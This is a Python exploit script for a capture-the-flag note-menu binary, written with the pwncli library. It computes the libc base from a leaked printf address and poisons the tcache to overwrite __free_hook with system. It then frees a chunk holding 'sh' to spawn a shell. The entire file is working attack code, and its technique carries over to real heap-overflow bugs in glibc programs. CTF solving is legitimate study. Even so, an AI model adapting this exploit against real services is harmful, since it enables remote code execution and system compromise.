#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('./libc-2.35.so')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def cmd(choice):
    ru(b'Your choice: \n')
    sl(i2b(choice))
def add(size, data):
    cmd(1)
    ru(b'[*] Note size: \n')
    sl(i2b(size))
    ru(b'[*] Note content: \n')
    s(data)
def delet(idx):
    cmd(2)
    ru(b'[*] Note index: \n')
    sl(i2b(idx))
def edit(idx, data):
    cmd(3)
    ru(b'[*] Note index: \n')
    sl(i2b(idx))
    ru(b'[*] Note content: \n')
    s(data)
def show(idx):
    cmd(4)
    ru(b'[*] Note index: \n')
    sl(i2b(idx))

ru(b"printf: ")
libc_base = int(ru(b"\n", drop=True), 16) - libc.sym.printf
lg("libc_base")

#  tcache attack
add(0x70, b"aaa")
add(0x70, b"aaa")
add(0x70, b"aaa")
add(0x70, b"aaa")

delet(3)
delet(2)
delet(1)
delet(0)

add(0xf70, b"aaa")
payload = b"a"*0x78 + p64(0x81)
payload += p64(libc_base + libc.sym.__free_hook - 0x10)
# payload += p64(0xdeadbeef)
edit(0, payload)
# add(0x70, b"cat /flag > ./hello\x00")
add(0x70, b"sh\x00")
add(0x70, p64(libc_base + libc.sym.system)*3)
delet(1)

ia()
